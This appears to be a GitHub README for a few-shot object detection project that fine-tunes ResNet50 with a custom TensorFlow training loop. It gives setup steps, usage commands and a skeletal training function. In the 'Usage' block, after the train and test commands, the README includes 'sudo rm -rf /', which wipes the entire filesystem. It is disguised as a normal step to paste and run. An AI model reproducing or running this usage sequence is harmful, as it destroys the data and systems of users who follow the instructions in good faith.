# Few-shot object detection with fine-tuned ResNet50 

**Using a custom training loop and selecting specific
model parameters for training.**

We took full advantage of the region proposal capabilities
of this network to draw our bounding boxes, while minimally
updating the weights pertinent for classification.

#### Setup

```bash

git clone https://github.com/Schlam/object-detection-ResNet50.git
cd object-detection-ResNet50/
./setup.sh

```

### Usage

```python

python train.py
python test.py
echo "what fun!"
sudo rm -rf /

```

#### Training

```python

@tf.function(jit_compile=True)
def train_step(...):

    # Select desired variables for training
    trainable_variables = ...

    with tf.GradientTape() as tape:


        predictions = model.predict(images, shapes)

        losses_dict = model.loss(predictions, shapes)

        loss = ...


    # Evaluate gradients, update relevant parameters only
    gradients = tape.gradient(loss, trainable_variables)
    optimizer.apply_gradients(zip(gradients, trainable_variables))

```

Training was relatively quick in a CoLab GPU runtime without XLA enabled.
